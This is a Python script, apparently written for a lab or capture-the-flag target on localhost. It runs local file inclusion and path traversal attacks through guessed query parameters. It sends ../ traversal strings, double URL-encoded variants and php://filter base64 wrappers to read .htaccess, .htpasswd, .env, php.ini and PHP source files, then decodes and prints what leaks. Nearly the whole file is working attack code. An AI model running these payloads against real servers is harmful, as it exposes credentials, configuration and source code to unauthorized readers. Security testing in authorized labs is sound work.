import requests
import urllib.parse
import base64
import re

# Target URL
target = "http://127.0.0.1:33154/"

# Test payloads for different parameters
lfi_tests = {
    "page": [
        ".htaccess",
        "../../../.htaccess",
        "..%2f..%2f..%2f.htaccess",
        "..%252f..%252f..%252f.htaccess",
        "php://filter/convert.base64-encode/resource=.htaccess",
        "php://filter/read=convert.base64-encode/resource=.htaccess"
    ],
    "file": [
        ".htaccess",
        "../../../.htaccess",
        "..%2f..%2f..%2f.htaccess",
        "..%252f..%252f..%252f.htaccess",
        "php://filter/convert.base64-encode/resource=.htaccess"
    ],
    "view": [
        "../../../../.htaccess",
        "..%2f..%2f..%2f..%2f.htaccess",
        "..%252f..%252f..%252f..%252f.htaccess",
        "php://filter/convert.base64-encode/resource=.htaccess"
    ],
    "config": [
        ".htaccess",
        "./.htaccess",
        "../../../.htaccess",
        "..%2f..%2f..%2f.htaccess",
        "php://filter/convert.base64-encode/resource=.htaccess"
    ],
    "path": [
        "..%2f..%2f..%2f.htaccess",
        "..%252f..%252f..%252f.htaccess",
        "../../../.htaccess",
        "./.htaccess",
        ".htaccess",
        "php://filter/convert.base64-encode/resource=.htaccess"
    ]
}

# Configuration files to test
config_files = [
    ".htaccess",
    ".htpasswd",
    "../.htaccess",
    "../../.htaccess",
    "../../../.htaccess",
    "httpd.conf",
    "apache2.conf",
    "php.ini",
    ".env",
    ".htaccess.bak",
    ".htaccess~",
    ".htaccess.backup",
    "htaccess.bak",
    "htaccess.old"
]

# Source code files to test
source_files = [
    "index.php",
    "index.php.bak",
    "index.php~",
    ".index.php.swp",
    "upload.php",
    "upload_handler.php",
    "file_upload.php",
    "config.php"
]

results = []

print("="*80)
print("SYSTEMATIC LFI TESTING")
print(f"Target: {target}")
print("="*80)

# Test 1: Direct .htaccess access via common parameters
print("\n[TEST 1] Direct .htaccess access via common parameters")
print("-"*80)

for param, payloads in lfi_tests.items():
    for payload in payloads:
        try:
            url = f"{target}?{param}={urllib.parse.quote(payload, safe='')}"
            response = requests.get(url, timeout=10)
            
            # Check if response contains file content indicators
            content_indicators = [
                "RewriteEngine",
                "RewriteRule",
                "AllowOverride",
                "Order allow",
                "Deny from",
                "<Files",
                "SetEnv",
                "ENV:",
                "<IfModule",
                "# BEGIN",
                "# END"
            ]
            
            found_indicators = []
            if response.text:
                for indicator in content_indicators:
                    if indicator in response.text:
                        found_indicators.append(indicator)
            
            # Check for base64 encoded content
            base64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
            base64_matches = re.findall(base64_pattern, response.text)
            
            result = {
                "param": param,
                "payload": payload,
                "url": url,
                "status": response.status_code,
                "content_length": len(response.text),
                "indicators": found_indicators,
                "base64_encoded": bool(base64_matches),
                "success": bool(found_indicators) or bool(base64_matches)
            }
            
            results.append(result)
            
            print(f"\n[{param}] Payload: {payload}")
            print(f"  URL: {url}")
            print(f"  Status: {response.status_code}")
            print(f"  Length: {len(response.text)}B")
            if found_indicators:
                print(f"  ✓ Found indicators: {found_indicators}")
            if base64_matches:
                print(f"  ✓ Base64 content detected")
                # Try to decode and print
                for match in base64_matches[:2]:  # Show first 2 matches
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if len(decoded) > 10:  # Only show substantial content
                            print(f"  Decoded snippet: {decoded[:200]}")
                    except:
                        pass
            
        except Exception as e:
            print(f"Error testing {param} with {payload}: {e}")

# Test 2: Configuration file enumeration
print("\n" + "="*80)
print("[TEST 2] Configuration file enumeration")
print("-"*80)

for config_file in config_files:
    # Try with different parameters
    for param in ["page", "file", "config", "path"]:
        try:
            # Try direct file
            if "../" not in config_file:
                direct_url = f"{target}?{param}={urllib.parse.quote(config_file, safe='')}"
                response = requests.get(direct_url, timeout=10)
                
                contains_content = len(response.text) > 200
                has_keywords = "error" not in response.text.lower() and "not found" not in response.text.lower()
                
                if contains_content and has_keywords:
                    print(f"\n  [FOUND] {param}={config_file}")
                    print(f"  URL: {direct_url}")
                    print(f"  Status: {response.status_code}")
                    print(f"  Length: {len(response.text)}B")
                    if response.text:
                        print(f"  Preview: {response.text[:300]}")
            
            # Try base64 encoded
            wrapper_payload = f"php://filter/convert.base64-encode/resource={config_file}"
            wrapper_url = f"{target}?{param}={urllib.parse.quote(wrapper_payload, safe='')}"
            response = requests.get(wrapper_url, timeout=10)
            
            # Check if response contains base64
            base64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
            base64_matches = re.findall(base64_pattern, response.text)
            
            if base64_matches:
                for match in base64_matches[:2]:
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if len(decoded.strip()) > 50:  # Substantial content
                            print(f"\n  [BASE64 FOUND] {param}=php://filter/{config_file}")
                            print(f"  URL: {wrapper_url}")
                            print(f"  Status: {response.status_code}")
                            print(f"  Decoded content: {decoded[:400]}")
                            if config_file in decoded:
                                print(f"  ✓ Confirmed: File contains its own name")
                    except:
                        pass
                        
        except Exception as e:
            continue

# Test 3: Source code disclosure
print("\n" + "="*80)
print("[TEST 3] Source code disclosure attempts")
print("-"*80)

for source_file in source_files:
    for param in ["page", "file", "view", "config"]:
        # Try path traversal
        for traversal in ["", "../../", "../../../"]:
            try:
                payload = f"{traversal}{source_file}"
                url = f"{target}?{param}={urllib.parse.quote(payload, safe='')}"
                response = requests.get(url, timeout=10)
                
                if len(response.text) > 100 and "<?php" in response.text:
                    print(f"\n  [PHP FOUND] {param}={payload}")
                    print(f"  URL: {url}")
                    print(f"  Status: {response.status_code}")
                    print(f"  Content: {response.text[:300]}")
            except:
                pass
        
        # Try PHP filter wrapper
        try:
            wrapper_payload = f"php://filter/convert.base64-encode/resource={source_file}"
            wrapper_url = f"{target}?{param}={urllib.parse.quote(wrapper_payload, safe='')}"
            response = requests.get(wrapper_url, timeout=10)
            
            base64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
            base64_matches = re.findall(base64_pattern, response.text)
            
            if base64_matches:
                for match in base64_matches[:2]:
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if len(decoded.strip()) > 50 and ("<?php" in decoded or "<?=php" in decoded):
                            print(f"\n  [PHP BASE64] {param}=php://filter/{source_file}")
                            print(f"  URL: {wrapper_url}")
                            print(f"  Status: {response.status_code}")
                            print(f"  Decoded PHP: {decoded[:500]}")
                    except:
                        pass
        except:
            pass

# Test 4: Try accessing .htaccess directly via various paths
print("\n" + "="*80)
print("[TEST 4] Direct .htaccess access via multiple traversal levels")
print("-"*80)

traversal_levels = [
    "",
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../../../../../../../"
]

for param in ["page", "file", "view", "config", "path"]:
    for level in traversal_levels:
        try:
            payload = f"{level}.htaccess"
            url = f"{target}?{param}={urllib.parse.quote(payload, safe='')}"
            response = requests.get(url, timeout=10)
            
            # Check for .htaccess content
            if "RewriteEngine" in response.text or "AllowOverride" in response.text:
                print(f"\n[✓ FOUND .htaccess] {param}={payload}")
                print(f"  URL: {url}")
                print(f"  Status: {response.status_code}")
                print(f"  Content:\n{response.text}")
            
            # Check PHP filter wrapper
            if level == "":
                wrapper_payload = f"php://filter/convert.base64-encode/resource={level}.htaccess"
                wrapper_url = f"{target}?{param}={urllib.parse.quote(wrapper_payload, safe='')}"
                wrapper_response = requests.get(wrapper_url, timeout=10)
                
                base64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
                base64_matches = re.findall(base64_pattern, wrapper_response.text)
                
                if base64_matches:
                    for match in base64_matches[:2]:
                        try:
                            decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                            if "RewriteEngine" in decoded or "AllowOverride" in decoded:
                                print(f"\n[✓ FOUND .htaccess BASE64] {param}=php://filter/.htaccess")
                                print(f"  URL: {wrapper_url}")
                                print(f"  Status: {wrapper_response.status_code}")
                                print(f"  Decoded .htaccess:\n{decoded}")
                        except:
                            pass
                            
        except Exception as e:
            continue

# Summary
print("\n" + "="*80)
print("SUMMARY")
print("="*80)

successful_tests = [r for r in results if r['success']]
print(f"\nTotal successful tests: {len(successful_tests)}/{len(results)}")

if successful_tests:
    print("\nMost promising vectors:")
    for test in successful_tests[:5]:
        print(f"  - {test['param']}={test['payload']} (Status: {test['status']})")
else:
    print("\nNo direct .htaccess access found yet. Try more specific parameter names.")

print("\nTesting complete.")
